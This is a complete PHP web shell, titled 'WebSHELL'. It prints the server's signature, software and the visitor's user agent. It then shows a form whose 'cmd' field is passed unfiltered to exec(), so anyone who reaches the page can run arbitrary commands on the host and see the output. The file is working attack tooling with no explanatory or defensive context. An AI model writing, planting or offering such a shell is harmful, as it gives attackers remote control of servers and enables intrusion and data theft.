<?php
echo "<b>WebSHELL</b>";
echo "<hr>";
echo $_SERVER['SERVER_SIGNATURE'];
echo $_SERVER['SERVER_SOFTWARE']."<br>";
echo $_SERVER['HTTP_USER_AGENT'];
echo "<hr>";
echo "<form action=webshell.php method=post>";
echo "# <input type=text name=cmd>";
echo "<input type=submit value=Exec>";
echo "</form>";
if (strlen($_POST['cmd'])!=0){
    echo "# ".$_POST['cmd']."<br>";
    exec($_POST['cmd'],$rez);
    foreach ($rez as $i){
	echo "$i<br>";
    }
}
?>